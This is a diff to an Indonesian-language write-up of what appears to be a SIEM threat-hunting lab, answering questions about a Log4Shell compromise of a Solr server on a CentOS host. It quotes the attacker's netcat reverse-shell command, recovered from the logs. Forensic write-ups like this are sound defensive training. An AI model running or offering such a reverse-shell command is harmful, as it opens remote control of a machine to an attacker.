@@ -141,8 +141,7 @@ Kami Kembali menelurusi lebih detail menggunakan analyze event menu. Disini kami
 ![image](https://user-images.githubusercontent.com/43168046/183103751-cddbc854-3a40-4093-bb35-793de99e7a72.png)
 
 ## 19.	If you focus on nc process, you can get the entire command that the attacker ran to get a reverse shell. Write the full command?
-disini kami mencoba mencari informasi berdasarakan traffic. kami pun masuk analytics dan discover. lalu berdasarkan pertanyaan sebelumnya kami menggunakan filter "host.name : "CentOS" and user.name : solr". kami pun menemukan 3 traffic data yang sesuai dengan filter kami. akhirnya kami menemukan command yang dimaksud. yaitu "	
-nc -e /bin/bash 192.168.1.10 9999"
+disini kami mencoba mencari informasi berdasarakan traffic. kami pun masuk analytics dan discover. lalu berdasarkan pertanyaan sebelumnya kami menggunakan filter "host.name : "host.name : CentOS and user.name : solr and process.args : nc". kami pun menemukan 3 traffic data yang sesuai dengan filter kami. akhirnya kami menemukan command yang dimaksud. yaitu "nc -e /bin/bash 192.168.1.10 9999"
 
 ![image](https://user-images.githubusercontent.com/43168046/183109658-0e03088a-f745-41e7-b018-655bec004a07.png)
 
@@ -150,6 +149,18 @@ nc -e /bin/bash 192.168.1.10 9999"
 Berdasarkan informasi terbaru, java vulenerability yang terkenal tersebut adalah apache log4j library yaitu log4shell 
 
 ## 21 . What is the entire log file path of the "solr" application?
+Kami kembali menelusuri dari ketiga data traffice tersebut. lalu kami menemukan field yang tersedia yaitu "process.parent.args". disini kami tampak samar melihat adanya "-Xloggc:/var/solr/logs/solr_gc.log". 
+
+![image](https://user-images.githubusercontent.com/43168046/183132395-b8d759a3-3d85-44b8-84d2-eecf0bd9d8ce.png)
+
+dan sampai kami menemukan tulisan pada suatu website yang menjelaskan struktur dari log solr. kami pun langsung menyimpulkan bahwa lokasi log dari solr tersebut adalah /var/solr/logs/solr.log
+
+![image](https://user-images.githubusercontent.com/43168046/183132146-87025191-36e6-4aa6-a538-1c77ad33f12e.png)
+
+
+
+
+
 
 
 
